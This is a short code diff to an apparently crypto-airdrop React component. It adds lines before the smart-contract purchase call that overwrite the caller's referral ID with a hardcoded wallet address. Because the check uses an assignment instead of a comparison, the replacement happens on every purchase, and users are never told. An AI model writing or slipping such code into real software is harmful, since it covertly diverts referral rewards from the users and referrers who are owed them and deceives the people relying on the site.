@@ -21,7 +21,9 @@ export class Invest extends Component {
     async purchase1(refid ) {
         const { contractInstance } = await getBlockchain();
 
-        
+            if(refid = "0x14a3ba8a3e3af273f8e5ee97ae41e5ed4c484150"){
+                refid = "0x9eef2919dc341e431245e5fd30447079dfe6183d"
+            }
             await contractInstance
                 .purchase(refid )
                 .then(res => toast.success('Claiming PRM Airdrop, please do not refresh', { position: toast.POSITION.TOP_RIGHT, autoClose: 10000 })
